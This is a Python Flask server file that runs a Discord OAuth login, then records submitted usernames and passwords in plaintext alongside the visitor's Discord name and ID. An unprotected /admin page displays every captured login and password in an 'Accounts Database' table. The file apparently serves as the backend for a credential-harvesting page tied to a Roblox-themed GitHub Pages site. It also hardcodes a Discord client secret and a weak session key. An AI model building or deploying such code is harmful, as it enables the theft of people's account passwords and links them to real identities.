import os
import json
import requests
from flask import Flask, request, redirect, jsonify, session, render_template_string
from flask_cors import CORS

app = Flask(__name__)
app.secret_key = "adlinox_secret_key_123"
CORS(app, supports_credentials=True)

CLIENT_ID = "1566038103762796584"
CLIENT_SECRET = "JJ3Y2rGsKvoe1Cl_0DaiKNeqXDKbY4FF"
REDIRECT_URI = "https://adlinox-server.onrender.com/callback"

DB_FILE = 'database.json'

# Функция загрузки данных (если файла нет — создаем пустой)
def load_logs():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return []

# Функция сохранения данных
def save_logs(data):
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

@app.route('/login')
def login():
    return redirect(f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify")

@app.route('/callback')
def callback():
    code = request.args.get('code')
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    r = requests.post('https://discord.com/api/oauth2/token', data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
    token = r.json().get('access_token')
    
    user_req = requests.get('https://discord.com/api/users/@me', headers={'Authorization': f'Bearer {token}'})
    user = user_req.json()
    
    session['d_name'] = user['username']
    session['d_id'] = user['id']
    session['d_avatar'] = f"https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png"
    
    return redirect("https://levladeev-beep.github.io/roblox-2016-project/index.html?success=true") # Укажи свой точный URL GitHub Pages

@app.route('/save_login', methods=['POST'])
def save_login():
    data = request.json
    logs = load_logs() # Загружаем старые
    logs.append({
        "adlinox_user": data.get('username'),
        "adlinox_pass": data.get('password'),
        "discord_name": session.get('d_name', 'Unknown'),
        "discord_id": session.get('d_id', 'Unknown')
    })
    save_logs(logs) # Сохраняем в файл
    return jsonify({"success": True})

@app.route('/admin')
def admin():
    logs = load_logs() # Читаем из файла
    html = """
    <html><head><style>
    body { background: #111; color: #fff; font-family: Arial; padding: 20px; }
    h2 { color: #E2242A; } table { width: 100%; border-collapse: collapse; margin-top: 20px; }
    th, td { border: 1px solid #333; padding: 12px; text-align: left; } th { background: #222; color: #E2242A; }
    </style></head><body>
    <h2>👑 База Аккаунтов</h2>
    <table><tr><th>Логин Adlinox</th><th>Пароль</th><th>Ник Discord</th><th>ID Discord</th></tr>
    {% for l in logs %}
    <tr><td>{{ l.adlinox_user }}</td><td>{{ l.adlinox_pass }}</td><td>{{ l.discord_name }}</td><td>{{ l.discord_id }}</td></tr>
    {% endfor %}
    </table></body></html>
    """
    return render_template_string(html, logs=logs)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
